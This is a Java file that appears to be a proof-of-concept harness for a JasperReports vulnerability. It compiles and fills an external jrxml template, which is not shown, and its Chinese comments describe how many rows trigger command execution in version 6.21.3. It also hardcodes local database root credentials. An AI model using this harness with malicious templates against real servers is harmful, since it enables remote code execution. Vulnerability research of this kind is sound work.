package com.mechoy.jasperreports;

import net.sf.jasperreports.engine.*;

import java.io.File;
import java.io.FileInputStream;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.HashMap;
import java.util.Map;

/**
 * jasperreports 漏洞测试
 * 读取文件时，文件后缀无限制，任何后缀都可以
 * 2024.5.14最新版本6.21.3可成功
 */
public class JasperReportsTest {
    public static void main(String[] args) throws Exception {
//        test1();
        test2();
    }

    /**
     * 直接解析jrxml 少了生成 .jasper的步骤
     * @throws Exception
     */
    public static void test1() throws Exception{
        Map<String, Object> hashMap = new HashMap<>();
        File file = new File("src/main/resources/jasperreports/jasper.jrxml");
        JasperReport parentReport = JasperCompileManager.compileReport(new FileInputStream(file));
        JasperPrint jasperPrint = JasperFillManager.fillReport(parentReport, hashMap, new JREmptyDataSource());//解析
    }

    /**
     * 先生成.jasper文件，然后再解析其中内容
     * 此处需要拿到一个数据库的查询得到resultSet
     * 注意：此处数据库查讯结果集行数将影响命令执行的次数,若行数为0则不会执行命令
     * 行数太多会将导致命令执行次数过多，吃内存
     * 尽量控制在数据库查询结果集的行数为1
     */
    public static void test2() throws Exception{
        String jrxml = "src/main/resources/jasperreports/jasper.jrxml";
        String jasper = "src/main/resources/jasperreports/jasper.jasper";
        Map<String, Object> hashMap = new HashMap<>();
        JasperCompileManager.compileReportToFile(jrxml,jasper);
        JasperFillManager.fillReport(jasper,hashMap,new JRResultSetDataSource(getResultSet()));
    }

    /**
     * 查询数据库拿到resultSet
     * 当然也可以直接构建一个resultSet，不过比较麻烦
     * @return
     * @throws Exception
     */
    public static ResultSet getResultSet() throws Exception{
        Class.forName("com.mysql.jdbc.Driver");
        String url = "jdbc:mysql://localhost:3306/tests?useSSL=true";
        String user = "root";
        String password = "root";

        Connection connection = DriverManager.getConnection(url, user, password);
        Statement statement = connection.createStatement();

        String sql = "Select * from users where id = 1";
        // 执行给定的SQL语句，该语句返回单个 ResultSet对象
        ResultSet resultSet = statement.executeQuery(sql);
        return resultSet;
    }
}
